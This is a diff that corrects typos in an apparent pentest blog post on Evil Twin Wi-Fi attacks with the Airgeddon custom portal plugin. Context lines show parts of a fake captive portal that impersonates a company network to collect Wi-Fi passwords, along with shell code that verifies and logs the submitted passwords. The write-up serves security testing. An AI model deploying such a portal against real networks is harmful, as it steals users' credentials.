@@ -10,13 +10,12 @@ show_date: true
 ---
 
 # Introduction
-During a Wi-Fi penetration test recently, I tried to explore further about Evil Twin attacks, which is one of the client-side attacks. To whom may not know much about this attack, Evil Twin attacks involve adversaries who attempt to mimic a target Wi-Fi access point with a rogue acccess point and to trick users to connect the fake one.
+During a Wi-Fi penetration test recently, I tried to explore further about Evil Twin attacks, which is one of the client-side attacks. To whom may not know much about this attack, Evil Twin attacks involve adversaries who attempt to mimic a target Wi-Fi access point with a rogue access point and to trick users to connect the fake one.
 
-# Custom Portal Plugin in Arigeddon
-
+# Custom Portal Plugin in Airgeddon
 ## Installation
 
-Download the script `customportals.sh` on [https://github.com/KeyofBlueS/airgeddon-plugins](https://github.com/KeyofBlueS/airgeddon-plugins) and put it in `/usr/share/airgeddon/plguins`. Also, create a folder called `custom_portals` which will store all your customized captive portal template.
+Download the script `customportals.sh` on [https://github.com/KeyofBlueS/airgeddon-plugins](https://github.com/KeyofBlueS/airgeddon-plugins) and put it in `/usr/share/airgeddon/plugins`. Also, create a folder called `custom_portals` which will store all your customized captive portal template.
 
 ```sh
 ┌──(root㉿kali)-[/usr/share/airgeddon/plugins]
@@ -53,7 +52,7 @@ echo -e '			<p class="description">Please enter the Wi-Fi password to gain acces
 echo -e '			<label><input id="password" maxlength="63" name="password" size="20" type="password" placeholder="Password" class="input-field"/></label>'
 echo -e '			<input type="submit" value="Connect" class="button"/>'
 echo -e '		</form>'
-echo -e '		<p class="warning">Only authorized persons are allowed to access the coporate network of ABC Company.</p>'
+echo -e '		<p class="warning">Only authorized persons are allowed to access the corporate network of ABC Company.</p>'
 echo -e '	</div>'
 exit 0
 ```
@@ -88,7 +87,7 @@ Then, check whether `KEY FOUND` is in the output of `aircrack-ng` to determine t
 ```sh
 if [ "$?" = "0" ]; then
 	touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
-	echo '<h1 class="success">Connection Success</h1>The password is correct, the connection will be restablished in a few moments'
+	echo '<h1 class="success">Connection Success</h1>The password is correct, the connection will be re-established in a few moments'
 	et_successful=1
 else
 	echo "${password}" >>\
